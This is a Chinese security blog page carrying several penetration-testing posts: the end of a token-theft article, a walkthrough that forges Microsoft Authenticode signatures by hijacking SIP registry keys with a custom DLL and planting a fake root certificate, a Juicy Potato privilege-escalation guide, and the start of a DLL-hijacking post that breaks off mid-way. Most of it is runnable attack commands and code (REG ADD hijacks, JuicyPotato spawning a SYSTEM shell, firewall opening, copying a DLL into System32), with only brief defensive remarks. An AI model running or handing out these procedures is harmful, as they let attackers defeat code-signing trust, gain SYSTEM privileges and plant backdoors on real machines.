<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whoami /groups | findstr TrustedInstaller
</code></pre></div></div>

<p>查看是否有回显</p>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>本文介绍了token窃取的实现方法，使用多种工具来获得system权限和TrustedInstaller权限。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on September 30, 2017
  </div>

  
</article><article class="post">
  <h1>Authenticode签名伪造——针对文件类型的签名伪造</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在上篇文章<a href="https://3gstudent.github.io/3gstudent.github.io/Authenticode%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0-PE%E6%96%87%E4%BB%B6%E7%9A%84%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0%E4%B8%8E%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81%E5%8A%AB%E6%8C%81/">《Authenticode签名伪造——PE文件的签名伪造与签名验证劫持》</a>介绍了针对单一文件的Authenticode签名伪造，需要在文件尾部添加伪造的签名数据，这次将介绍另一种签名伪造方式：通过修改系统的签名获取机制，欺骗系统将正常文件识别为包含签名数据。</p>

<p><strong>注：</strong></p>

<p>本文介绍的技巧参考自Matt Graeber@mattifestation公开的资料，本文将结合自己的经验，整理相关内容，添加个人理解。</p>

<p><strong>参考资料：</strong></p>

<p>https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf</p>

<p>http://www.exploit-monday.com/2017/08/application-of-authenticode-signatures.html</p>

<p>https://drive.google.com/file/d/0B-K55rLoulAfNms1aW1rbXF1Tmc/view</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>针对powershell脚本的签名伪造方法</li>
  <li>针对PE文件的签名伪造方法</li>
  <li>针对其他类型文件的签名伪造方法</li>
  <li>添加代码实现对特定文件的签名伪造</li>
</ul>

<h2 id="0x02-针对powershell脚本的签名伪造方法">0x02 针对powershell脚本的签名伪造方法</h2>
<hr>

<p>前提是powershell脚本需要包含一个签名(自己生成的签名会被识别为无效)，下面介绍如何将该无效签名伪造成有效的微软签名</p>

<p>生成测试证书：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>makecert -n "CN=Microsoft Windows Test1" -r -eku 1.3.6.1.5.5.7.3.3 -sv certtest.pvk certtest.cer
cert2spc certtest.cer certtest.spc
pvk2pfx -pvk certtest.pvk -pi 123456 -spc certtest.spc -pfx certtest.pfx -f
</code></pre></div></div>

<p>不需要注册该证书</p>

<p><strong>注：</strong></p>

<p>使用makecert.exe要加参数： <code class="language-plaintext highlighter-rouge">-eku 1.3.6.1.5.5.7.3.3</code></p>

<p>否则提示证书无法用于代码签名，具体错误如下：</p>

<p><code class="language-plaintext highlighter-rouge">Set-AuthenticodeSignature : Cannot sign code. The specified certificate is not
suitable for code signing.</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/2-1.png" alt="Alt text"></p>

<p>给powershell脚本签名：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$cert = Get-PfxCertificate certtest.pfx
Set-AuthenticodeSignature -Filepath 1.ps1 -Cert $cert
</code></pre></div></div>

<p>验证证书：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-AuthenticodeSignature .\1.ps1
</code></pre></div></div>

<p>提示<code class="language-plaintext highlighter-rouge">UnknownError</code>，表示文件签名无效</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/2-2.png" alt="Alt text"></p>

<p>修改注册表，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{603BCC1F-4B59-4E08-B724-D2C6297EF351}" /v "Dll" /t REG_SZ /d "C:\test\MySIP.dll" /f
REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{603BCC1F-4B59-4E08-B724-D2C6297EF351}" /v "FuncName" /t REG_SZ /d "AutoApproveHash" /f

REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{603BCC1F-4B59-4E08-B724-D2C6297EF351}" /v "Dll" /t REG_SZ /d "C:\test\MySIP.dll" /f
REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{603BCC1F-4B59-4E08-B724-D2C6297EF351}" /v "FuncName" /t REG_SZ /d "GetLegitMSSignature" /f
</code></pre></div></div>

<p>再次验证：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-AuthenticodeSignature .\1.ps1
</code></pre></div></div>

<p>显示<code class="language-plaintext highlighter-rouge">Valid</code>，签名有效</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/2-3.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>不同系统下相同名称的文件签名不同</p>

<p><code class="language-plaintext highlighter-rouge">AFDD80C4EBF2F61D3943F18BB566D6AA6F6E5033</code>为Matt Graeber测试系统中的notepad.exe签名hash</p>

<p>现在在我们自己的系统进行测试：<code class="language-plaintext highlighter-rouge">Win10 x64</code></p>

<p>分别获取notepad.exe的签名信息：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-AuthenticodeSignature c:\windows\system32\notepad.exe
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sigcheck -i C:\Windows\System32\notepad.exe
</code></pre></div></div>

<p>可以发现sigcheck的输出内容中，<code class="language-plaintext highlighter-rouge">Thumbprint</code>对应文件签名hash，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/3-1.png" alt="Alt text"></p>

<p>接下来，将测试系统改为<code class="language-plaintext highlighter-rouge">Win7 x86</code></p>

<p>在Win7下使用<code class="language-plaintext highlighter-rouge">Get-AuthenticodeSignature</code>无法获得notepad.exe的签名信息(catalog签名)</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/3-2.png" alt="Alt text"></p>

<p>但可以通过sigcheck获得，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/3-3.png" alt="Alt text"></p>

<p>hash为：<code class="language-plaintext highlighter-rouge">018B222E21FBB2952304D04D1D87F736ED46DEA4</code></p>

<p>定位cat文件路径：<code class="language-plaintext highlighter-rouge">C:\Windows\system32\CatRoot\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}\ntexe.cat</code></p>

<p>.cat文件保存格式为ASN.1标准，直接通过记事本无法查看，需要解密，在线网址如下：</p>

<p>https://lapo.it/asn1js/</p>

<p>选择cat文件后即可解密显示完整格式</p>

<p>格式解析可参考：</p>

<p>https://support.microsoft.com/en-us/help/287547/object-ids-associated-with-microsoft-cryptography</p>

<p>将该文件替换PoCSubjectInterfacePackage工程中的<code class="language-plaintext highlighter-rouge">MS_cert.bin</code>，重新编译</p>

<p>配置注册表</p>

<p>打开一个新的cmd，查看powershell脚本签名：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-AuthenticodeSignature .\1.ps1
</code></pre></div></div>

<p>同sighcheck获取的hash值保持一致，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/3-4.png" alt="Alt text"></p>

<p>powershell脚本的Authenticode签名伪造成功</p>

<p>对以上操作直观的理解：</p>

<p><strong>该方法是通过修改系统证书验证过程，使文件将指定的catalog签名作为自己的Authenticode签名</strong></p>

<p>当然，所有带签名的powershell脚本均会统一成hash为<code class="language-plaintext highlighter-rouge">018B222E21FBB2952304D04D1D87F736ED46DEA4</code>的签名，这就带来了一个问题：<strong>这样会影响正常系统文件的签名校验</strong></p>

<p>我们可以看到，通过这种方式伪造的签名会作用于所有powershell脚本，那么，我们能否针对特定powershell脚本作伪造呢？</p>

<p>以Matt Graeber开源的工程PoCSubjectInterfacePackage作为模板进行修改，下载地址如下：</p>

<p>https://github.com/mattifestation/PoCSubjectInterfacePackage</p>

<p>重点关注函数<code class="language-plaintext highlighter-rouge">GetLegitMSSignature</code>，在线地址：</p>

<p>https://github.com/mattifestation/PoCSubjectInterfacePackage/blob/master/MySIP/MySIP.c#L138</p>

<p>查看结构<code class="language-plaintext highlighter-rouge">SIP_SUBJECTINFO *pSubjectInfo</code>的参数说明，地址如下：</p>

<p>https://msdn.microsoft.com/en-us/library/windows/desktop/bb736434(v=vs.85).aspx</p>

<p><code class="language-plaintext highlighter-rouge">pwsFileName</code>和<code class="language-plaintext highlighter-rouge">pwsDisplayName</code>均能够表示文件名称，所以可通过<code class="language-plaintext highlighter-rouge">MessageBox</code>进行验证</p>

<p>函数<code class="language-plaintext highlighter-rouge">GetLegitMSSignature</code>内添加如下代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MessageBox (NULL, pSubjectInfo-&gt;pwsFileName, pSubjectInfo-&gt;pwsDisplayName,0);  
</code></pre></div></div>

<p>进行测试，成功获得传入文件名，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/4-1.png" alt="Alt text"></p>

<p>接下来的思路：</p>

<p>对传入的文件名称进行判断，满足条件的文件加载对应的catalog签名，最终实现对特定文件的签名伪造</p>

<p>筛选文件的代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if(lstrcmpi((LPCTSTR)pSubjectInfo-&gt;pwsFileName,L"C:\\test\\cer\\1.ps1")==0)
{
	MessageBox (NULL,L"Get selected file", (LPCTSTR)pSubjectInfo-&gt;pwsFileName,0) ;   
}
</code></pre></div></div>

<p>完整代码可参考：</p>

<p>https://raw.githubusercontent.com/3gstudent/test/master/MySIP.c</p>

<p>当前文件为<code class="language-plaintext highlighter-rouge">C:\test\cer\1.ps1</code>时，符合条件，进行签名伪造，否则放弃</p>

<p>测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/4-2.png" alt="Alt text"></p>

<p>成功实现对特定文件的签名伪造，这种方式的优点是不需要在文件尾部添加Authenticode签名，不改变文件hash</p>

<p>当然，这仅仅是一个POC，还要对系统文件的签名验证做判断</p>

<h2 id="0x03-针对pe文件的签名伪造方法">0x03 针对PE文件的签名伪造方法</h2>
<hr>

<p>参考这个列表：</p>

<ul>
  <li>C689AAB8-8E78-11D0-8C47-00C04FC295EE - PE</li>
  <li>DE351A43-8E59-11D0-8C47-00C04FC295EE - catalog	.cat文件</li>
  <li>9BA61D3F-E73A-11D0-8CD2-00C04FC295EE - CTL .ctl文件</li>
  <li>C689AABA-8E78-11D0-8C47-00C04FC295EE - cabinet .cab文件</li>
</ul>

<p>如果替换exe文件的校验，即<code class="language-plaintext highlighter-rouge">CryptSIPDllVerifyIndirectData</code>和<code class="language-plaintext highlighter-rouge">CryptSIPDllGetSignedDataMsg</code>，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "Dll" /t REG_SZ /d "C:\test\MySIP.dll" /f
REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "FuncName" /t REG_SZ /d "AutoApproveHash" /f

REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "Dll" /t REG_SZ /d "C:\test\MySIP.dll" /f
REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "FuncName" /t REG_SZ /d "GetLegitMSSignature" /f
</code></pre></div></div>

<p>重启explorer.exe，所有的exe文件都包含hash为：<code class="language-plaintext highlighter-rouge">018B222E21FBB2952304D04D1D87F736ED46DEA4</code>的签名</p>

<p>特别的地方：<strong>伪造的签名来自于cat文件，但是会以Authenticode签名的格式显示，通过文件属性能够看到签名信息(这是Authenticode签名的特性，catalog签名不具有该特性)</strong></p>

<p>同样，修改原工程能够实现针对特定PE文件的签名伪造，方法不再赘述</p>

<h2 id="0x04-针对cat文件的签名伪造方法">0x04 针对cat文件的签名伪造方法</h2>
<hr>

<p>如果对所有.cat文件的签名验证过程进行替换，再将其添加到安全编录数据库中，那么，包含catalog签名的PE文件是否也随即获得伪造签名呢？</p>

<p>下面开始测试：</p>

<p>新建文本文档cat.txt，内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[CatalogHeader]
Name=makecat1.cat
[CatalogFiles]
&lt;hash&gt;ExeFile1=mimikatz.exe

</code></pre></div></div>

<p><strong>注：</strong></p>

<p>txt文件尾部需要一个空行，否则，在接下来的操作会报错，提示文件无法找到</p>

<p>使用makecat.exe生成makecat1.cat：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>makecat -v cat.txt
</code></pre></div></div>

<p>为makecat1.cat添加伪造的Authenticode签名：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>signtool sign /f certtest.pfx /p 123456 makecat1.cat
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>certtest.pfx不能使用之前手动生成的证书，不能加参数： <code class="language-plaintext highlighter-rouge">-eku 1.3.6.1.5.5.7.3.3</code>，否则exe文件的catalog签名将会校验失败</p>

<p>生成certtest.pfx的操作如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>makecert -n "CN=Microsoft Windows Test1" -r -sv certtest.pvk certtest.cer
cert2spc certtest.cer certtest.spc
pvk2pfx -pvk certtest.pvk -pi 123456 -spc certtest.spc -pfx certtest.pfx -f
</code></pre></div></div>

<p>此处还需要将证书安装到“受信任的根证书颁发机构”存储区</p>

<p>管理员权限：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certmgr.exe -add -c certtest.cer -s -r localmachine root
</code></pre></div></div>

<p>否则，之后的签名验证会报错，提示证书链不可信</p>

<p><strong>补充：</strong></p>

<p>从“受信任的根证书颁发机构”存储区删除证书的操作为：</p>

<p>(管理员权限)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certmgr.exe -del -c -n "Windows Test1" -s -r localMachine Root
</code></pre></div></div>

<p>cat文件对应GUID:<code class="language-plaintext highlighter-rouge">DE351A43-8E59-11D0-8C47-00C04FC295EE</code></p>

<p>替换注册表键值：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{DE351A43-8E59-11D0-8C47-00C04FC295EE}" /v "Dll" /t REG_SZ /d "C:\test\MySIP.dll" /f
REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{DE351A43-8E59-11D0-8C47-00C04FC295EE}" /v "FuncName" /t REG_SZ /d "AutoApproveHash" /f

REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{DE351A43-8E59-11D0-8C47-00C04FC295EE}" /v "Dll" /t REG_SZ /d "C:\test\MySIP.dll" /f
REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{DE351A43-8E59-11D0-8C47-00C04FC295EE}" /v "FuncName" /t REG_SZ /d "GetLegitMSSignature" /f
</code></pre></div></div>

<p>重启explorer.exe，所有的cat文件签名均为<code class="language-plaintext highlighter-rouge">Microsoft Windows</code></p>

<p>将makecat1.cat添加到系统的安全编录数据库：</p>

<p>(管理员权限)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>signtool catdb -v makecat1.cat
</code></pre></div></div>

<p>最终，发现文件的catalog签名保持不变，无法进行伪造</p>

<p>得出结论： <strong>这种方式无法对catalog签名进行伪造</strong></p>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>本文介绍了Authenticode签名伪造的另一种利用方法：通过修改系统的签名获取机制，欺骗系统将正常文件识别为包含签名数据。</p>

<p>经过这两篇文章的测试，得出最终结论：应谨慎对待系统的Authenticode签名，因为通过修改注册表或dll劫持等方式均能够伪造出微软签名，对此，白名单等防御机制不应盲目相信Authenticode签名过的文件。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on October 11, 2017
  </div>

  
</article><article class="post">
  <h1>Windows本地提权工具Juicy Potato测试分析</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>Juicy Potato是一款Windows系统的本地提权工具，是在工具RottenPotatoNG的基础上做了扩展，适用条件更广</p>

<p>利用的前提是获得了SeImpersonate或者SeAssignPrimaryToken权限，通常在webshell下使用</p>

<p>那么，Juicy Potato的使用方法有哪些，有哪些限制条件呢？本文将对其进行测试，根据原理分析限制条件</p>

<p>Juicy Potato的下载地址：</p>

<p>https://github.com/ohpe/juicy-potato</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本将要介绍以下内容：</p>

<ul>
  <li>实现原理</li>
  <li>对RottenPotatoNG的扩展</li>
  <li>枚举可用COM对象的方法</li>
  <li>使用方法</li>
  <li>限制条件</li>
  <li>防御思路</li>
</ul>

<h2 id="0x02-实现原理">0x02 实现原理</h2>
<hr>

<p>参考资料：</p>

<p>https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/</p>

<p>根据个人理解介绍实现原理</p>

<p>需要理解的几个知识：</p>

<ol>
  <li>使用DCOM时，如果以服务的方式远程连接，那么权限为System，例如BITS服务</li>
  <li>使用DCOM可以通过TCP连接到本机的一个端口，发起NTLM认证，该认证可以被重放</li>
  <li>LocalService用户默认具有SeImpersonate和SeAssignPrimaryToken权限</li>
  <li>开启SeImpersonate权限后，能够在调用CreateProcessWithToken时，传入新的Token创建新的进程</li>
  <li>开启SeAssignPrimaryToken权限后，能够在调用CreateProcessAsUser时，传入新的Token创建新的进程</li>
</ol>

<p>Juicy Potato的实现流程如下：</p>

<h4 id="1加载com发出请求权限为system">1、加载COM，发出请求，权限为System</h4>

<p>在指定ip和端口的位置尝试加载一个COM对象</p>

<p>RottenPotatoNG使用的COM对象为BITS，CLSID为<code class="language-plaintext highlighter-rouge">{4991d34b-80a1-4291-83b6-3328366b9097}</code></p>

<p>可供选择的COM对象不唯一，Juicy Potato提供了多个，详细列表可参考如下地址：</p>

<p>https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</p>

<h4 id="2回应步骤1的请求发起ntlm认证">2、回应步骤1的请求，发起NTLM认证</h4>

<p>正常情况下，由于权限不足，当前权限不是System，无法认证成功</p>

<h4 id="3针对本地端口同样发起ntlm认证权限为当前用户">3、针对本地端口，同样发起NTLM认证，权限为当前用户</h4>

<p>由于权限为当前用户，所以NTLM认证能够成功完成</p>

<p>RottenPotatoNG使用的135端口</p>

<p>Juicy Potato支持指定任意本地端口，但是RPC一般默认为135端口，很少被修改</p>

<h4 id="4分别拦截两个ntlm认证的数据包替换数据通过ntlm重放使得步骤1权限为system的ntlm认证通过获得system权限的token">4、分别拦截两个NTLM认证的数据包，替换数据，通过NTLM重放使得步骤1(权限为System)的NTLM认证通过，获得System权限的Token</h4>

<p>重放时需要注意NTLM认证的NTLM Server Challenge不同，需要修正</p>

<h4 id="5利用system权限的token创建新进程">5、利用System权限的Token创建新进程</h4>

<p>如果开启SeImpersonate权限，调用CreateProcessWithToken，传入System权限的Token，创建的进程为System权限</p>

<p>或者</p>

<p>如果开启SeAssignPrimaryToken权限，调用CreateProcessAsUser，传入System权限的Token，创建的进程为System权限</p>

<p><strong>注：</strong></p>

<p>详细说明可参考之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows-Token%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90%E7%9A%84%E5%88%A9%E7%94%A8/">《渗透技巧——Windows Token九种权限的利用》</a></p>

<p><strong>利用的关键：</strong></p>

<p>当前用户支持SeImpersonate或者SeAssignPrimaryToken权限</p>

<p>以下用户具有该权限：</p>

<ul>
  <li>本地管理员组成员和本地服务帐户</li>
  <li>由服务控制管理器启动的服务</li>
  <li>由组件对象模型 (COM) 基础结构启动的并配置为在特定帐户下运行的COM服务器</li>
</ul>

<p>针对提权的话，主要是第三类用户，常见的为LocalService用户，例如IIS和者sqlserver的用户</p>

<h2 id="0x03-枚举可用com对象的方法">0x03 枚举可用COM对象的方法</h2>
<hr>

<p>Juicy Potato提供了枚举可用COM对象的方法，步骤如下：</p>

<h4 id="1获得可用clsid的列表">1、获得可用CLSID的列表</h4>

<p>使用GetCLSID.ps1，地址如下：</p>

<p>https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1</p>

<p><strong>注：</strong></p>

<p>使用时同级目录下需要包含支持文件<code class="language-plaintext highlighter-rouge">.\utils\Join-Object.ps1</code></p>

<p>执行成功后生成文件<code class="language-plaintext highlighter-rouge">CLSID.list</code>和<code class="language-plaintext highlighter-rouge">CLSID.csv</code></p>

<h4 id="2使用批处理调用juicypotatoexe逐个测试clsid">2、使用批处理调用juicypotato.exe逐个测试CLSID</h4>

<p>批处理地址如下：</p>

<p>https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat</p>

<p>juicypotato.exe的参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>juicypotato.exe -z -l !port! -c %%i &gt;&gt; result.log
</code></pre></div></div>

<p>-z表示测试模式，只验证Token，不使用Token创建进程</p>

<p>-l为端口，起始为1000，每次循环加1</p>

<p>-c为从文件CLSID.list获得的CLSID</p>

<p>Juicy Potato已经测试了如下Windows系统：</p>

<ul>
  <li>Windows 7 Enterprise</li>
  <li>Windows 8.1 Enterprise</li>
  <li>Windows 10 Enterprise</li>
  <li>Windows 10 Professional</li>
  <li>Windows Server 2008 R2 Enterprise</li>
  <li>Windows Server 2012 Datacenter</li>
  <li>Windows Server 2016 Standard</li>
</ul>

<p>我在测试的过程中，在Server2012下执行GetCLSID.ps1时会报错，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-9-1/4-1.png" alt="Alt text"></p>

<p>出错在位置在<code class="language-plaintext highlighter-rouge">.\utils\Join-Object.ps1</code></p>

<p>这里给出一种修改方法：</p>

<h4 id="1枚举所有满足条件的clsid">1、枚举所有满足条件的CLSID</h4>

<p>powershell代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT | Out-Null
$CLSID = Get-ItemProperty HKCR:\clsid\* | select-object AppID,@{N='CLSID'; E={$_.pschildname}} | where-object {$_.appid -ne $null}
foreach($a in $CLSID)
{
	Write-Host $a.CLSID
}
</code></pre></div></div>

<p>可以选择将结果保存为<code class="language-plaintext highlighter-rouge">CLSID.list</code></p>

<h4 id="2使用批处理调用juicypotatoexe逐个验证">2、使用批处理调用juicypotato.exe逐个验证</h4>

<p>地址如下：</p>

<p>https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat</p>

<p>bat脚本不需要做修改</p>

<h2 id="0x04-使用方法">0x04 使用方法</h2>
<hr>

<h3 id="1查看当前用户权限是否符合要求">1、查看当前用户权限，是否符合要求</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whoami /priv
</code></pre></div></div>

<p>如果开启SeImpersonate权限，juicypotato的参数可以使用<code class="language-plaintext highlighter-rouge">-t t</code></p>

<p>如果开启SeAssignPrimaryToken权限，juicypotato的参数可以使用<code class="language-plaintext highlighter-rouge">-t u</code></p>

<p>如果均开启，可以选择<code class="language-plaintext highlighter-rouge">-t *</code></p>

<p>如果均未开启，那么无法提权</p>

<h3 id="2查看rpc默认端口是否为135">2、查看RPC默认端口是否为135</h3>

<p>如果被修改(例如为111)，juicypotato的参数可以使用<code class="language-plaintext highlighter-rouge">-n 111</code></p>

<p>如果系统禁用了RPC，并不是一定无法提权，需要满足如下条件：</p>

<p>找到另一系统，能够以当前用户的权限进行远程RPC登录，此时juicypotato的参数可以使用<code class="language-plaintext highlighter-rouge">-k &lt;ip&gt;</code></p>

<p>例如Win7、WIn8系统，默认配置下，允许135端口的入站规则即可进行远程RPC登录</p>

<p>添加防火墙规则允许135端口入站的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh advfirewall firewall add rule name="135" protocol=TCP dir=in localport=135 action=allow
</code></pre></div></div>

<p>也可以选择将防火墙关闭，可参考绕过UAC关闭防火墙的代码：</p>

<p>https://github.com/3gstudent/Use-COM-objects-to-bypass-UAC/blob/master/DisableFirewall.cpp</p>

<h3 id="3根据操作系统选择可用的clsid">3、根据操作系统选择可用的CLSID</h3>

<p>参考列表</p>

<p>https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</p>

<p>例如测试系统Server2012，选择CLSID为<code class="language-plaintext highlighter-rouge">{8BC3F05E-D86B-11D0-A075-00C04FB68820}</code></p>

<h3 id="4选择一个系统未占用的端口作为监听端口">4、选择一个系统未占用的端口作为监听端口</h3>

<p>例如，最终参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>JuicyPotato.exe -t t -p c:\windows\system32\cmd.exe -l 1111 -c {8BC3F05E-D86B-11D0-A075-00C04FB68820}
</code></pre></div></div>

<p>表示开启SeImpersonate权限创建进程，监听端口1111，使用的CLSID为<code class="language-plaintext highlighter-rouge">{8BC3F05E-D86B-11D0-A075-00C04FB68820}</code></p>

<h2 id="0x05-限制条件">0x05 限制条件</h2>
<hr>

<p>经过以上的分析，Juicy Potato的限制条件如下：</p>

<ul>
  <li>需要支持SeImpersonate或者SeAssignPrimaryToken权限</li>
  <li>开启DCOM</li>
  <li>本地支持RPC或者远程服务器支持PRC并能成功登录</li>
  <li>能够找到可用的COM对象</li>
</ul>

<h2 id="0x06-防御思路">0x06 防御思路</h2>
<hr>

<p>站在防御的角度，服务器禁用DCOM，禁用RPC，或者为每一个COM对象配置属性均不现实</p>

<p>针对Juicy Potato的关键在于权限的控制，阻止攻击者获得SeImpersonate或者SeAssignPrimaryToken权限</p>

<h2 id="0x07-补充">0x07 补充</h2>
<hr>

<p>更多学习资料：</p>

<p>https://bugs.chromium.org/p/project-zero/issues/detail?id=325&amp;redir=1</p>

<h2 id="0x08-小结">0x08 小结</h2>
<hr>

<p>本文对Juicy Potato进行测试，总结使用方法，同RottenPotatoNG进行比较，分析原理，找到限制条件和防御思路</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on September 10, 2018
  </div>

  
</article><article class="post">
  <h1>《Lateral Movement — SCM and DLL Hijacking Primer》的利用扩展</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>《Lateral Movement — SCM and DLL Hijacking Primer》介绍了三个dll(wlbsctrl.dll、TSMSISrv.dll和TSVIPSrv.dll)可以通过SCM(Service Control Manager)实现远程执行。本文将要扩展这三个dll的用法，分别介绍提权和后门利用的方法</p>

<p>文章链接：</p>

<p>https://posts.specterops.io/lateral-movement-scm-and-dll-hijacking-primer-d2f61e8ab992</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>利用wlbsctrl.dll实现的提权</li>
  <li>利用TSMSISrv.dll和TSVIPSrv.dll实现的后门</li>
  <li>利用MF.dll实现的后门</li>
</ul>

<h2 id="0x03-wlbsctrldll的利用">0x03 wlbsctrl.dll的利用</h2>
<hr>

<h3 id="1原文中的用法">1、原文中的用法</h3>

<p>IKEEXT(IKE and AuthIP IPsec Keying Modules)服务在启动时会加载wlbsctrl.dll，但Windows系统默认配置下该dll不存在，如果我们将自己的dll放在这个位置，在服务启动时就能加载该dll</p>

<p>POC：</p>

<p>https://github.com/djhohnstein/wlbsctrl_poc</p>

<p>测试系统： Win7 x64</p>

<p>这里使用的dll不需要指定导出函数，所以可以直接使用之前我的测试dll：</p>

<p>https://github.com/3gstudent/test/raw/master/calc_x64.dll</p>

<p>本地执行的用法：
(需要管理员权限)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy calc_x64.dll C:\Windows\System32\wlbsctrl.dll
sc query IKEEXT
sc stop IKEEXT
sc start IKEEXT
</code></pre></div></div>

<p>远程执行的用法：</p>

